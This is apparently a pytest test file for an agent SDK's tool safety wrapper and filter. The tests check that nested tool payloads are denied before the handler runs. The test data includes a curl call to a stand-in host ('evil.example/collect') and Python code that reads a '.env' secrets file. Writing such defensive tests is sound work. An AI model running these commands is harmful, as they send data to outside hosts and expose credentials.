from unittest.mock import Mock

import pytest

from trpc_agent_sdk.tools.safety import ToolSafetyFilter
from trpc_agent_sdk.tools.safety import ToolSafetyWrapper


def _run_wrapped(payload, *, language="bash"):
    calls = []

    def handler(**kwargs):
        calls.append(kwargs)
        return {"success": True, "payload": kwargs}

    result = ToolSafetyWrapper(language=language).wrap(handler)(**payload)
    return result, calls


def test_wrapper_blocks_nested_tool_input_command_args_before_call():
    payload = {"payload": {"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}}}

    result, calls = _run_wrapped(payload)

    assert result["error"] == "SAFETY_GUARD_BLOCKED"
    assert result["safety_report"]["decision"] == "deny"
    assert calls == []


def test_wrapper_blocks_nested_python_command_args_before_call():
    payload = {"params": {"arguments": {"command": "python", "command_args": ["-c", "open('.env').read()"]}}}

    result, calls = _run_wrapped(payload)

    assert result["error"] == "SAFETY_GUARD_BLOCKED"
    assert result["safety_report"]["decision"] == "deny"
    assert calls == []


def test_wrapper_blocks_code_blocks_before_call():
    payload = {"code_blocks": [{"language": "python", "code": "open('.env').read()"}]}

    result, calls = _run_wrapped(payload)

    assert result["error"] == "SAFETY_GUARD_BLOCKED"
    assert result["safety_report"]["decision"] == "deny"
    assert calls == []


def test_wrapper_allows_nested_safe_payload_and_calls_handler():
    payload = {"payload": {"tool_input": {"cmd": "echo", "args": ["ok"]}}}

    result, calls = _run_wrapped(payload)

    assert result["success"] is True
    assert calls == [payload]


@pytest.mark.asyncio
async def test_filter_and_wrapper_make_same_decision_for_nested_payload():
    payload = {"payload": {"tool_input": {"cmd": "curl", "args": ["https://evil.example/collect"]}}}

    filter_result = await ToolSafetyFilter().run(Mock(), payload, lambda: {"success": True})
    wrapper_result, calls = _run_wrapped(payload)

    assert calls == []
    assert filter_result.rsp["safety_report"]["decision"] == wrapper_result["safety_report"]["decision"]
